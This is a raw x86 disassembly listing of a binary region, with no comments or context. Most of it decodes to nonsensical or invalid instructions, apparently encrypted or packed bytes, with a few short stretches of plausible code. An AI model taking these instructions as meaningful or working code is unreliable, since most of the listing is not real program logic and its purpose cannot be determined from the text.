  41302c:	fcomip st,st(0)
  41302e:	push   esp
  41302f:	sub    al,0xa5
  413031:	scas   eax,DWORD PTR es:[edi]
  413032:	leave  
  413033:	shr    DWORD PTR [edx+0x41435d41],cl
  413039:	lock inc esi
  41303b:	adc    DWORD PTR [ebx],ebp
  41303d:	inc    esp
  41303e:	mov    DWORD PTR [ebp+0x4e0156e2],0xe9054d1a
  413048:	scas   al,BYTE PTR es:[edi]
  413049:	mov    WORD PTR [ecx],gs
  41304b:	sbb    ebx,ecx
  41304d:	mov    ch,0x31
  41304f:	sub    eax,0x597568b7
  413054:	hlt    
  413055:	dec    ebx
  413056:	into   
  413057:	mov    dh,0xad
  413059:	pop    esi
  41305a:	imul   ecx,edi,0xfffffffb
  41305d:	sub    al,0x5b
  41305f:	bound  edi,QWORD PTR [ebp+0x73]
  413062:	cmp    BYTE PTR [esi],ah
  413064:	pop    ebx
  413065:	push   edi
  413066:	aad    0xcf
  413068:	push   eax
  413069:	pop    eax
  41306a:	jmp    0x6bbf4561
  41306f:	ror    dh,0xb
  413072:	or     esi,DWORD PTR [edi]
  413074:	out    0x6f,al
  413076:	mov    ebp,0x63ca4620
  41307b:	and    ecx,DWORD PTR [ecx+ebp*1-0x4c6cf997]
  413082:	jne    0x413077
  413084:	pop    edx
  413085:	push   ebx
  413086:	xlat   BYTE PTR ds:[ebx]
  413087:	scas   al,BYTE PTR es:[edi]
  413088:	iret   
  413089:	mov    DWORD PTR [edx],edi
  41308b:	inc    esp
  41308c:	mov    WORD PTR [esp+eax*8+0x4c],es
  413090:	test   al,0x29
  413092:	int3   
  413093:	jne    0x41308d
  413095:	aam    0xdb
  413097:	sub    ch,dl
  413099:	lahf   
  41309a:	nop
  41309b:	or     eax,0x1d9df40e
  4130a0:	or     al,0x96
  4130a2:	ss (bad) 
  4130a4:	jg     0x413097
  4130a6:	jnp    0x41311c
  4130a8:	cmp    al,0x1d
  4130aa:	xor    DWORD PTR [ebx],ebx
  4130ac:	pusha  
  4130ad:	or     dh,bl
  4130af:	sahf   
  4130b0:	dec    ecx
  4130b1:	jle    0x4130fe
  4130b3:	(bad)  
  4130b4:	adc    al,0x32
  4130b6:	ins    DWORD PTR es:[edi],dx
  4130b7:	lock enter 0xce45,0x5d
  4130bc:	mov    esi,0x897928df
  4130c1:	mov    ecx,0xab53c4e3
  4130c6:	sbb    BYTE PTR [ebx-0x2f51241a],ch
  4130cc:	ror    DWORD PTR [ebp-0x7fe6a267],1
  4130d2:	(bad)  
  4130d3:	mov    dh,0x52
  4130d5:	sbb    al,0xe
  4130d7:	fst    DWORD PTR [edi]
  4130d9:	push   esi
  4130da:	ins    BYTE PTR es:[edi],dx
  4130db:	jo     0x4130c4
  4130dd:	mov    bl,0xf0
  4130df:	lds    ebp,FWORD PTR [ecx-0x49de7402]
  4130e5:	push   edi
  4130e6:	jo     0x4130b1
  4130e8:	mov    bh,0x4f
  4130ea:	test   eax,0xb1b4a187
  4130ef:	push   es
  4130f0:	xor    DWORD PTR [eax],edi
  4130f2:	ds mov dl,0xde
  4130f5:	pop    esi
  4130f6:	sub    ebx,DWORD PTR [esi-0x38]
  4130f9:	rol    BYTE PTR [ebp+0x4],1
  4130fc:	arpl   WORD PTR [ecx],cx
  4130fe:	out    dx,al
  4130ff:	dec    ecx
  413100:	sar    esp,1
  413102:	lods   al,BYTE PTR ds:[esi]
  413103:	push   eax
  413104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413105:	add    BYTE PTR [esi],bl
  413107:	xlat   BYTE PTR ds:[ebx]
  413108:	scas   al,BYTE PTR es:[edi]
  413109:	or     BYTE PTR ds:0x609ae090,0x65
  413110:	es sbb eax,0xc6666f7c
  413116:	and    esp,DWORD PTR [esi+ebp*2+0x4b]
  41311a:	adc    al,0x0
  41311c:	inc    edi
  41311d:	out    dx,eax
  41311e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41311f:	in     eax,0x80
  413121:	xchg   esp,eax
  413122:	add    DWORD PTR [edx*4+0x6e305c9f],edx
  413129:	pusha  
  41312a:	or     DWORD PTR [ebp+0x1a],0x19272e7d
  413131:	rcr    DWORD PTR [ebp-0x15],1
  413134:	dec    esi
  413135:	cdq    
  413136:	mov    dh,0xa1
  413138:	cmp    ch,BYTE PTR [edi]
  41313a:	jne    0x413106
  41313c:	into   
  41313d:	lea    ebp,[ebx*8-0x5debc31e]
  413144:	lods   eax,DWORD PTR ds:[esi]
  413145:	fs xchg esi,eax
  413147:	das    
  413148:	mov    DWORD PTR [ebp-0x28],esi
  41314b:	mov    DWORD PTR [ebp-0x2c],esi
  41314e:	mov    DWORD PTR [ebp-0x14],esi
  413151:	adc    ecx,0x52b8
  413157:	mov    DWORD PTR [ebp-0x8],esi
  41315a:	xor    ecx,DWORD PTR ds:0x42fdf9
  413160:	mov    ecx,DWORD PTR [ebp-0x18]
  413163:	xor    ecx,eax
  413165:	adc    DWORD PTR ds:0x42e228,ebx
  41316b:	xor    edi,edi
  41316d:	jmp    0x413451
  413172:	push   0x51581534
  413177:	popa   
  413178:	jne    0x4131ae
  41317a:	add    edx,ebp
  41317c:	cmp    al,BYTE PTR [ecx]
  41317e:	cmp    cl,BYTE PTR [ebx+0x61a3fdd4]
  413184:	jo     0x4131f6
  413186:	mov    ecx,0x1f70707e
  41318b:	ins    DWORD PTR es:[edi],dx
  41318c:	add    bh,0xd9
  41318f:	push   0x42
  413191:	or     ch,0xc8
  413194:	(bad)  
  413196:	mov    cl,0x45
  413198:	adc    eax,eax
  41319a:	mov    esp,0x2fa42b65
  41319f:	(bad)  
  4131a0:	not    DWORD PTR [ebx]
  4131a2:	mov    ds:0xc5cf302e,al
  4131a7:	xor    WORD PTR [eax+eax*4-0x19],bx
  4131ac:	ror    BYTE PTR [esi+0xc7031a8],0xb3
  4131b3:	mov    eax,ds:0x1f64c07f
  4131b8:	int3   
  4131b9:	and    ebx,ebp
  4131bb:	inc    edx
  4131bc:	push   cs
  4131bd:	push   edi
  4131be:	sub    al,bh
  4131c0:	jo     0x4131a8
  4131c2:	xchg   ecx,eax
  4131c3:	mov    gs,WORD PTR [edx]
  4131c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131c6:	enter  0x6abe,0x14
  4131ca:	and    eax,0xc1dd2c4f
  4131cf:	sbb    eax,0x4872cb0
  4131d4:	arpl   WORD PTR [ebx],ax
  4131d6:	cdq    
  4131d7:	and    DWORD PTR [ebx],edi
  4131d9:	data16 stos BYTE PTR es:[edi],al
  4131db:	pop    ebp
  4131dc:	add    DWORD PTR [ebx+esi*1-0x64ecc8bc],esp
  4131e3:	sub    eax,DWORD PTR [edi+0x637773e5]
  4131e9:	out    dx,al
  4131ea:	sub    BYTE PTR [esi-0x2fc186be],cl
  4131f0:	cwde   
  4131f1:	push   ebp
  4131f2:	adc    eax,DWORD PTR ds:0x233da809
  4131f8:	xchg   esp,eax
  4131f9:	adc    eax,0x352d3cb6
  4131fe:	test   eax,0x64b5de92
  413203:	fsubr  QWORD PTR ds:0xf2d9113e
  413209:	pop    eax
  41320a:	xor    BYTE PTR [edx],ch
  41320c:	jmp    FWORD PTR [eax]
  41320e:	in     ax,0x67
  413211:	cwde   
  413212:	loop   0x41321e
  413214:	gs jle 0x41325f
  413217:	sub    ebx,edx
  413219:	gs inc ecx
  41321b:	lds    ebp,FWORD PTR [ebp-0x79]
  41321e:	cmp    esp,DWORD PTR [ebx]
  413220:	(bad)  
  413221:	out    dx,al
  413222:	mov    al,ds:0xdccf625d
  413227:	pop    ecx
  413228:	jl     0x413295
  41322a:	add    eax,0xfb182b88
  41322f:	imul   edi,DWORD PTR [edi+0x3bd3f4fe],0x44
  413236:	rcl    ah,1
  413238:	in     al,dx
  413239:	call   DWORD PTR [ebx]
  41323b:	dec    esi
  41323c:	xchg   ebp,eax
  41323d:	and    BYTE PTR [ebx+0x52],ah
  413240:	ss aam 0x18
  413243:	out    dx,al
  413244:	push   ebx
  413245:	outs   dx,BYTE PTR ds:[esi]
  413246:	dec    esp
  413247:	inc    ecx
  413248:	pop    ebp
  413249:	add    esi,edx
  41324b:	(bad)  
  41324c:	xor    BYTE PTR [ecx+0x6b191547],ah
  413252:	xor    BYTE PTR [ecx],ah
  413254:	stos   BYTE PTR es:[edi],al
  413255:	ins    BYTE PTR es:[edi],dx
  413256:	ins    BYTE PTR es:[edi],dx
  413257:	xor    al,0xf6
  413259:	jg     0x413294
  41325b:	or     al,0xfb
  41325d:	enter  0x25e1,0x58
  413261:	and    al,0x3b
  413263:	repnz mov edx,0x3a322b82
  413269:	repnz test edi,edi
  41326c:	jge    0x4132cd
  41326e:	frstor [ebp+0xf]
  413271:	cmc    
  413272:	push   es
  413273:	jne    0x413214
  413275:	xor    bh,BYTE PTR [ebx-0x2a]
  413278:	pop    ecx
  413279:	and    dl,BYTE PTR [edi+0x1eb2c0d8]
  41327f:	out    0x51,al
  413281:	mov    al,ds:0xbe197091
  413286:	es dec ebp
  413288:	out    dx,al
  413289:	sbb    eax,0x4529b8e6
  41328e:	icebp  
  41328f:	add    al,dl
  413291:	xor    DWORD PTR ds:0x298a25a,esp
  413297:	fldenv ds:0x10122c66
  41329e:	mov    bl,0x1
  4132a0:	cdq    
  4132a1:	dec    edx
  4132a2:	nop
  4132a3:	xor    al,0xef
  4132a5:	out    dx,al
  4132a6:	test   BYTE PTR [ebp-0x1e50b53c],0x18
  4132ad:	mov    DWORD PTR [ebx-0x8fd6c48],esi
  4132b3:	in     al,dx
  4132b4:	sub    al,dh
  4132b6:	push   es
  4132b7:	dec    edi
  4132b8:	cld    
  4132b9:	adc    BYTE PTR [edx+0x3e],bl
  4132bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132bd:	add    al,0x41
  4132bf:	out    dx,al
  4132c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132c1:	mov    al,0xfe
  4132c3:	bound  esp,QWORD PTR [edi+0x26]
  4132c6:	push   ecx
  4132c7:	pop    edx
  4132c8:	mov    ebx,0x614d4661
  4132cd:	fcom   DWORD PTR [ecx]
  4132cf:	push   ss
  4132d0:	sbb    edx,DWORD PTR ds:0x585cd75
  4132d6:	loopne 0x41326f
  4132d8:	sbb    BYTE PTR [ebp+0x7473c529],ch
  4132de:	jno    0x413333
  4132e0:	adc    cl,BYTE PTR [esi]
  4132e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132e3:	in     al,0x14
  4132e5:	inc    ecx
  4132e6:	(bad)  
  4132e7:	or     eax,0xbf72b7bc
  4132ec:	sub    dh,BYTE PTR [ecx]
  4132ee:	in     eax,0x7c
  4132f0:	(bad)  
  4132f2:	out    dx,al
  4132f3:	(bad)  
  4132f4:	mov    esp,0x5032ecae
  4132f9:	test   DWORD PTR gs:[esp+ebp*1-0x48c99e66],edx
  413301:	push   eax
  413302:	scas   al,BYTE PTR es:[edi]
  413303:	jle    0x4132b1
  413305:	mov    ds:0xffc9ac88,al
  41330a:	int3   
  41330b:	out    dx,eax
  41330c:	popf   
  41330d:	fld    DWORD PTR [ebp-0xd857dee]
  413313:	mov    edx,0x42264a40
  413318:	add    BYTE PTR [edi+ebx*1+0x20],dh
  41331c:	mov    ebp,edi
  41331e:	rol    BYTE PTR [edx+0x1],0xc4
  413322:	xchg   ecx,eax
  413323:	(bad)  
  413324:	leave  
  413325:	sub    edx,DWORD PTR [esi+eax*2]
  413328:	mov    bh,BYTE PTR [edx]
  41332a:	ds mov bl,0xf
  41332d:	mov    ecx,0x704a4be
  413332:	inc    ecx
  413333:	pop    ss
  413334:	rol    DWORD PTR [ebx],cl
  413336:	mov    ebx,eax
  413338:	mov    eax,0x373619c
  41333d:	lods   al,BYTE PTR ds:[esi]
  41333e:	xor    esp,0x6
  413341:	xchg   ebp,eax
  413342:	push   0xffffffc7
  413344:	pop    edi
  413345:	shl    esi,0x90
  413348:	ret    0x2bbf
  41334b:	push   ss
  41334c:	popa   
  41334d:	in     al,0xbe
  41334f:	xor    eax,0x578bd73
  413354:	jno    0x4133af
  413356:	call   FWORD PTR [ebx+0x54]
  413359:	xor    DWORD PTR [esp+eiz*4-0x29],0xf33831ec
  413361:	mov    ds:0x78c5e1fe,al
  413366:	jbe    0x413392
  413368:	mov    cl,0xf4
  41336a:	mov    esi,0xe063b542
  41336f:	cli    
  413370:	sub    DWORD PTR [esi+ebp*8-0x33],ebx
  413374:	push   es
  413375:	pop    edi
  413376:	inc    edi
  413377:	cmp    ebp,DWORD PTR [eax]
  413379:	pop    ebx
  41337a:	imul   eax,edx,0xffffffb2
  41337d:	pop    esi
  41337e:	daa    
  41337f:	mov    esi,0x190d0dea
  413384:	repnz mov cs,WORD PTR [edi+0x45]
  413388:	test   ah,ah
  41338a:	loop   0x4133a2
  41338c:	dec    ebp
  41338d:	das    
  41338e:	mov    cl,0xc6
  413390:	mov    cl,0x1c
  413392:	inc    esi
  413393:	addr16 xchg esp,eax
  413395:	adc    edx,edi
  413397:	and    bh,ah
  413399:	sahf   
  41339a:	inc    eax
  41339b:	test   al,0x91
  41339d:	xchg   esi,eax
  41339e:	fwait
  41339f:	jb     0x41339c
  4133a1:	mov    edi,0x88afe4aa
  4133a6:	popa   
  4133a7:	adc    eax,0x5084a2eb
  4133ac:	stos   BYTE PTR es:[edi],al
  4133ad:	jo     0x4133e5
  4133af:	std    
  4133b0:	cmovns ecx,DWORD PTR [edx+0x9]
  4133b4:	call   0xf80b:0x150e405b
  4133bb:	xchg   ebp,eax
  4133bc:	sub    BYTE PTR [edi+0x1d2af0ed],ch
  4133c2:	(bad)  
  4133c3:	popf   
  4133c4:	inc    ebp
  4133c6:	sbb    al,0x2b
  4133c8:	cwde   
  4133c9:	clc    
  4133ca:	leave  
  4133cb:	add    eax,DWORD PTR [eax+0x5113616e]
  4133d1:	shl    BYTE PTR [ecx+0x7b082405],cl
  4133d7:	xchg   ebp,eax
  4133d8:	cwde   
  4133d9:	pop    ss
  4133da:	retf   
  4133db:	enter  0x58d8,0x8b
  4133df:	das    
  4133e0:	pop    esp
  4133e1:	mov    ds:0x565e94f6,al
  4133e6:	mov    esp,0xf97b2909
  4133eb:	and    al,0xf8
  4133ed:	ins    BYTE PTR es:[edi],dx
  4133ee:	inc    ecx
  4133ef:	xchg   ebp,eax
  4133f0:	popa   
  4133f1:	mov    ds:0xdf8af304,al
  4133f6:	push   cs
  4133f7:	dec    esp
  4133f8:	add    BYTE PTR ds:0xf6609514,dl
  4133fe:	out    0x9f,al
  413400:	(bad)  
  413401:	sub    BYTE PTR [edx+0x293b5d64],cl
  413407:	ror    DWORD PTR [ecx],cl
  413409:	pop    ebp
  41340a:	scas   eax,DWORD PTR es:[edi]
  41340b:	fisubr DWORD PTR [ebx+0x9735934]
  413411:	aad    0xf7
  413413:	stos   BYTE PTR es:[edi],al
  413414:	aad    0xcb
  413416:	jp     0x413407
  413418:	jmp    0x406e:0x323ead5a
  41341f:	mov    bl,0xb5
  413421:	cmp    cl,0x94
  413424:	fld    DWORD PTR [edi+eiz*4+0x6d]
  413428:	xlat   BYTE PTR ds:[ebx]
  413429:	imul   ebx,DWORD PTR [esi+0x79a9c34f],0xe2df9fe4
  413433:	enter  0xd66a,0x40
  413437:	pop    edi
  413438:	sub    DWORD PTR [eax],edi
  41343a:	mov    dl,0x4f
  41343c:	inc    edi
  41343d:	adc    DWORD PTR [edx],ebp
  41343f:	dec    ecx
  413440:	jmp    0x143a:0xb87e3499
  413447:	cli    
  413448:	scas   al,BYTE PTR es:[edi]
  413449:	fwait
  41344a:	es rcr bh,0xa0
  41344e:	mov    eax,ds:0xcb037c52
  413453:	mov    eax,0x213e
  413458:	mov    DWORD PTR [ebp-0x20],ecx
  41345b:	mov    eax,DWORD PTR [ebp-0x20]
  41345e:	je     0x414b6a
  413464:	not    DWORD PTR ds:0x42fdf9
  41346a:	mov    eax,DWORD PTR [ebp-0x4]
  41346d:	xor    eax,0x7510855
  413472:	xor    DWORD PTR ds:0x42fdd5,0x8f6
  41347c:	add    eax,ebx
  41347e:	jmp    0x413762
  413483:	inc    edx
  413484:	mov    WORD PTR [eax],cs
  413486:	jp     0x41345e
  413488:	adc    BYTE PTR [edx+0x54],0xc3
  41348c:	mov    ss:0x34880c0f,al
  413492:	stos   BYTE PTR es:[edi],al
  413493:	in     al,dx
  413494:	outs   dx,BYTE PTR ds:[esi]
  413495:	jo     0x413507
  413497:	mov    ecx,0xcd70707e
  41349c:	scas   al,BYTE PTR es:[edi]
  41349d:	push   ds
  41349e:	int3   
  41349f:	shl    BYTE PTR [edi],cl
  4134a1:	jmp    0x4134a8
  4134a3:	cdq    
  4134a4:	stos   DWORD PTR es:[edi],eax
  4134a5:	sub    eax,0x4906b82c
  4134aa:	inc    eax
  4134ab:	out    dx,eax
  4134ac:	and    ah,bl
  4134ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134af:	loopne 0x413479
  4134b1:	xor    ebx,edi
  4134b3:	cdq    
  4134b4:	dec    edi
  4134b5:	aas    
  4134b6:	stos   DWORD PTR es:[edi],eax
  4134b7:	rol    bh,cl
  4134b9:	hlt    
  4134ba:	sbb    bl,BYTE PTR [edx]
  4134bc:	push   ecx
  4134bd:	rol    DWORD PTR [ecx],1
  4134bf:	sub    dh,BYTE PTR [edx+ebp*8+0x18]
  4134c3:	mov    DWORD PTR [ecx],0x887f021d
  4134c9:	in     al,dx
  4134ca:	sub    BYTE PTR [eax+ecx*4-0x7],ah
  4134ce:	jecxz  0x4134a8
  4134d0:	sub    edx,DWORD PTR [ebx+edi*2-0x48]
  4134d4:	sahf   
  4134d5:	jge    0x4134df
  4134d7:	push   0x806a935a
  4134dc:	xor    DWORD PTR [esi+0x19ec25b2],0x8
  4134e3:	lods   al,BYTE PTR ds:[esi]
  4134e4:	mov    bl,0x1f
  4134e6:	pop    edi
  4134e7:	pop    ss
  4134e8:	xchg   ebp,eax
  4134e9:	in     al,dx
  4134ea:	inc    esp
  4134eb:	pop    edx
  4134ec:	enter  0x4302,0x6
  4134f0:	xchg   edi,eax
  4134f1:	inc    esp
  4134f2:	sub    bh,ah
  4134f4:	xchg   BYTE PTR [ecx+esi*4],ch
  4134f7:	mov    edx,0x47bb8c0e
  4134fc:	xor    al,0x5b
  4134fe:	adc    DWORD PTR [ebp+0x142de841],esp
  413504:	cdq    
  413505:	xchg   ecx,eax
  413506:	std    
  413507:	adc    eax,0x6e61a2e0
  41350c:	sbb    ah,0x76
  41350f:	in     eax,0x42
  413511:	pop    ebp
  413512:	dec    esp
  413513:	loopne 0x41351f
  413515:	in     al,0xfe
  413517:	xchg   ecx,eax
  413518:	ins    DWORD PTR es:[edi],dx
  413519:	mov    ebp,0x1a1309c4
  41351e:	mov    DWORD PTR [ebx],ebp
  413520:	shl    DWORD PTR [eax],cl
  413522:	sti    
  413523:	retf   
  413524:	data16 int 0x32
  413527:	scas   al,BYTE PTR es:[edi]
  413528:	inc    ecx
  413529:	cli    
  41352a:	shl    ch,cl
  41352c:	lahf   
  41352d:	jns    0x4134d1
  41352f:	test   DWORD PTR [edx+edi*1],ebx
  413532:	mov    esi,0x3baa262f
  413537:	fwait
  413538:	in     eax,0x65
  41353a:	or     eax,0x8a946cee
  41353f:	mov    ebp,0xd6357a22
  413544:	fwait
  413545:	mov    eax,ds:0x75377eed
  41354a:	ds loope 0x413514
  41354d:	cwde   
  41354e:	xor    bl,BYTE PTR [eax-0x2d]
  413551:	sbb    al,0xb2
  413553:	and    BYTE PTR [ebx],bh
  413555:	ror    DWORD PTR [edi-0x5c2d60f],cl
  41355b:	repz out dx,eax
  41355d:	xchg   ebp,eax
  41355e:	sub    ch,BYTE PTR [ebx+0x33]
  413561:	aas    
  413562:	retf   
  413563:	mov    ebx,0xab6e1372
  413568:	push   ss
  413569:	push   ebp
  41356a:	xchg   ebx,eax
  41356b:	sub    BYTE PTR [ebx+0x518bae73],dl
  413571:	retf   
  413572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413573:	and    bl,bh
  413575:	or     bl,BYTE PTR [esi-0xb5929c3]
  41357b:	fidivr DWORD PTR [edx+0x31]
  41357e:	fnsave [edx+eiz*4]
  413581:	icebp  
  413582:	xor    BYTE PTR [bp+di],bh
  413585:	(bad)  
  413587:	push   edx
  413588:	add    al,0x99
  41358a:	loopne 0x4135c3
  41358c:	xchg   esp,eax
  41358d:	bound  ebx,QWORD PTR [esi]
  41358f:	cmc    
  413590:	shl    DWORD PTR [edi-0x9f4bd1b],cl
  413596:	outs   dx,DWORD PTR ds:[esi]
  413597:	mov    ecx,0x3ee744b5
  41359c:	aas    
  41359d:	inc    ebx
  41359e:	mov    eax,0x165b987e
  4135a3:	push   esp
  4135a4:	mov    edi,0x68ecd732
  4135a9:	repnz push ds
  4135ab:	stos   BYTE PTR es:[edi],al
  4135ac:	lock out 0xc2,eax
  4135af:	dec    esp
  4135b0:	push   0xd
  4135b2:	xchg   ebp,eax
  4135b3:	ins    BYTE PTR es:[edi],dx
  4135b4:	arpl   WORD PTR [edi],bx
  4135b6:	sti    
  4135b7:	cmp    DWORD PTR [edx+0x2abf5b01],edx
  4135bd:	bound  ebp,QWORD PTR [esi+0x5f450039]
  4135c3:	cmp    al,0x80
  4135c5:	push   ebx
  4135c6:	inc    edx
  4135c7:	pop    edi
  4135c8:	dec    esp
  4135c9:	sbb    bh,BYTE PTR [edx]
  4135cb:	test   ah,al
  4135cd:	bound  esi,QWORD PTR [edx+0x47]
  4135d0:	fisubr WORD PTR [ebx+0x7c]
  4135d3:	push   es
  4135d4:	dec    ebp
  4135d5:	xchg   esp,eax
  4135d6:	pop    edi
  4135d7:	retf   
  4135d8:	dec    edi
  4135d9:	cmp    dh,ch
  4135db:	mov    bl,0xe8
  4135dd:	call   0xb4fda57b
  4135e2:	xchg   ecx,eax
  4135e3:	ret    0x5eb5
  4135e6:	daa    
  4135e7:	fsub   st(0),st
  4135e9:	xchg   ebp,eax
  4135ea:	dec    esi
  4135eb:	icebp  
  4135ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135ed:	fwait
  4135ee:	add    eax,0x64f8eb10
  4135f3:	cwde   
  4135f4:	imul   BYTE PTR [ecx-0x4f]
  4135f7:	sbb    edi,edi
  4135f9:	xor    al,BYTE PTR [ecx-0x4a90410c]
  4135ff:	inc    edi
  413600:	sub    DWORD PTR [edx],0xffffff88
  413603:	push   ebp
  413604:	(bad)  
  413605:	push   ss
  413606:	inc    eax
  413607:	js     0x413622
  413609:	loop   0x4135c5
  41360b:	mov    ah,0x36
  41360d:	cmp    DWORD PTR [eax],0xffffffe9
  413610:	or     BYTE PTR [esi-0x38a53337],ah
  413616:	pop    edx
  413617:	cmp    eax,0x1dd5953b
  41361c:	sub    al,0xb2
  41361e:	push   esi
  41361f:	push   es
  413620:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413621:	dec    esp
  413622:	and    DWORD PTR [ecx+0x732ea995],edx
  413628:	push   es
  413629:	std    
  41362a:	push   cs
  41362b:	mov    al,0x42
  41362d:	mov    dh,BYTE PTR [eax+0x6669c226]
  413633:	or     BYTE PTR [ebx],0x1b
  413636:	cmp    eax,0x691bdcdb
  41363b:	mov    eax,0x73fb2ed0
  413640:	dec    edx
  413641:	or     dl,bh
  413643:	jecxz  0x413611
  413645:	fadd   st(7),st
  413647:	pop    WORD PTR ds:0xc49d8f7a
  41364e:	outs   dx,BYTE PTR ds:[esi]
  41364f:	aas    
  413650:	repz cmp DWORD PTR [ebp-0x44953bf6],esi
  413657:	xor    al,0xee
  413659:	jo     0x413633
  41365b:	mov    DWORD PTR [ebx+0x77],esi
  41365e:	ss stc 
  413660:	leave  
  413661:	neg    DWORD PTR [esi-0x58a1e17f]
  413667:	xor    al,0xad
  413669:	lgs    edi,FWORD PTR [esi-0x6e]
  41366d:	push   0xe6c4b735
  413672:	(bad)  
  413673:	imul   ebp,DWORD PTR [edi],0xffffffe8
  413676:	mov    esi,0xed1e49e1
  41367b:	or     edx,ebp
  41367d:	aas    
  41367e:	push   ebx
  41367f:	aaa    
  413680:	xor    BYTE PTR [bp+0x2],0x8e
  413685:	sub    bl,BYTE PTR [edx+0x3cb8b9e9]
  41368b:	push   ss
  41368c:	cdq    
  41368d:	jle    0x41370a
  41368f:	cmp    DWORD PTR [eax-0x62],0xf3892add
  413696:	sbb    al,0x65
  413698:	cwde   
  413699:	mov    fs,WORD PTR [edi+ecx*1-0x2e]
  41369d:	das    
  41369e:	test   al,0xd7
  4136a0:	scas   al,BYTE PTR es:[edi]
  4136a1:	push   ebp
  4136a2:	mov    al,0xed
  4136a4:	js     0x41365b
  4136a6:	jbe    0x41370b
  4136a8:	loop   0x413659
  4136aa:	mov    BYTE PTR [ebx+0x25],ch
  4136ad:	mov    esi,0xf69ed1a6
  4136b2:	(bad)  
  4136b3:	popf   
  4136b4:	pop    es
  4136b5:	push   ebp
  4136b6:	jl     0x41372b
  4136b8:	push   ds
  4136b9:	hlt    
  4136ba:	sub    BYTE PTR [ebx+0x3d],cl
  4136bd:	cli    
  4136be:	ss cwde 
  4136c0:	xor    edx,ecx
  4136c2:	add    al,dl
  4136c4:	es scas eax,DWORD PTR es:[edi]
  4136c6:	cwde   
  4136c7:	scas   al,BYTE PTR es:[edi]
  4136c8:	xchg   BYTE PTR [esi-0x5],bh
  4136cb:	pop    edx
  4136cc:	(bad)  
  4136cd:	js     0x41367b
  4136cf:	or     bh,BYTE PTR [edx]
  4136d1:	lods   eax,DWORD PTR ds:[esi]
  4136d2:	mov    edx,0xe22448fe
  4136d7:	add    DWORD PTR [esp+esi*2-0x47256994],0x6a75594c
  4136e2:	call   0xcc9e:0xd76959c2
  4136e9:	xchg   edx,eax
  4136ea:	sub    ch,cl
  4136ec:	inc    eax
  4136ed:	push   es
  4136ee:	addr16 jmp 0xbf37:0xd40d9c22
  4136f6:	cmp    al,0x9f
  4136f8:	mov    dl,0xb
  4136fa:	fbld   TBYTE PTR [esi-0x5b026f3d]
  413700:	ss cwde 
  413702:	ins    DWORD PTR es:[edi],dx
  413703:	push   esi
  413704:	push   ds
  413705:	arpl   WORD PTR ds:0xa2fa67fe,dx
  41370b:	outs   dx,BYTE PTR ds:[esi]
  41370c:	jmp    0x5fd3:0xa49c217
  413713:	pop    ecx
  413714:	mov    bh,0x25
  413716:	dec    edi
  413717:	repnz lds eax,FWORD PTR [ecx-0x23]
  41371b:	jno    0x41371d
  41371d:	sub    al,0x2
  41371f:	iret   
  413720:	push   eax
  413721:	retf   
  413722:	in     eax,dx
  413723:	jmp    0x41373d
  413725:	dec    esp
  413726:	mov    ds:0xa84edcee,al
  41372b:	add    DWORD PTR [esi+0x6f],edx
  41372e:	pop    ss
  41372f:	daa    
  413730:	imul   BYTE PTR [ebp+0x36b52b34]
  413736:	xor    ebp,ebp
  413738:	jmp    0x4136f0
  41373a:	mov    DWORD PTR [edx+0x6841c80d],esp
  413740:	xchg   ecx,eax
  413741:	pop    esi
  413742:	shl    BYTE PTR [esi-0x5ec5bb87],0xb
  413749:	xlat   BYTE PTR ds:[ebx]
  41374a:	adc    DWORD PTR [edi*4+0x393c9164],0x49d62c7f
  413755:	cmp    al,0x4
  413757:	add    DWORD PTR [esi],ebp
  413759:	aam    0x5a
  41375b:	sub    DWORD PTR [eax-0x4b695b35],esp
  413761:	sbb    bh,BYTE PTR [ebx]
  413763:	clc    
  413764:	jne    0x4141ef
  41376a:	push   DWORD PTR [ebp+0x8]
  41376d:	jmp    0x413a51
  413772:	and    al,0x98
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	shr    BYTE PTR [esp+edx*8-0x305f8b9c],0x9e
  41377d:	in     al,dx
  41377e:	dec    ebx
  41377f:	dec    edi
  413780:	int3   
  413781:	or     eax,0x70706b35
  413786:	mov    ecx,0x8d70707e
  41378b:	arpl   WORD PTR [esi],bp
  41378d:	in     ax,dx
  41378f:	xor    DWORD PTR [edx+0x6ce895a0],eax
  413795:	and    DWORD PTR [edx],edi
  413797:	jmp    0x2db4:0x479ade5a
  41379e:	pop    ebx
  41379f:	ror    BYTE PTR [eax-0x55],1
  4137a2:	jo     0x413773
  4137a4:	adc    al,cl
  4137a6:	sub    ah,bh
  4137a8:	jg     0x41375d
  4137aa:	out    0x40,al
  4137ac:	mov    BYTE PTR [esi+0x57],dl
  4137af:	or     dh,BYTE PTR [edi]
  4137b1:	dec    edx
  4137b2:	adc    eax,DWORD PTR [ecx-0x2]
  4137b5:	xchg   ebx,eax
  4137b6:	xor    dl,cl
  4137b8:	dec    esi
  4137b9:	sbb    ebx,esi
  4137bb:	push   ebp
  4137bc:	scas   eax,DWORD PTR es:[edi]
  4137bd:	sar    esp,0x29
  4137c0:	or     al,BYTE PTR [ebx-0x49]
  4137c3:	dec    edx
  4137c4:	mov    ah,0x79
  4137c6:	sub    eax,0x6700ce17
  4137cb:	pop    esp
  4137cc:	push   eax
  4137cd:	jo     0x4137e2
  4137cf:	push   ecx
  4137d0:	cmp    al,BYTE PTR [esi+0x62]
  4137d3:	dec    ebx
  4137d4:	cmp    DWORD PTR [esi+eiz*4-0x152b2d49],eax
  4137db:	int3   
  4137dc:	bound  ecx,QWORD PTR [ebx-0x7789e4e]
  4137e2:	jp     0x4137b1
  4137e4:	push   ss
  4137e5:	(bad)  
  4137e6:	std    
  4137e7:	aaa    
  4137e8:	lock dec edi
  4137ea:	ffreep st(1)
  4137ec:	mov    esi,0x8adfbb0e
  4137f1:	mov    eax,ds:0x79935a59
  4137f6:	dec    edi
  4137f7:	dec    edi
  4137f8:	retf   0x735b
  4137fb:	xchg   esi,eax
  4137fc:	(bad)
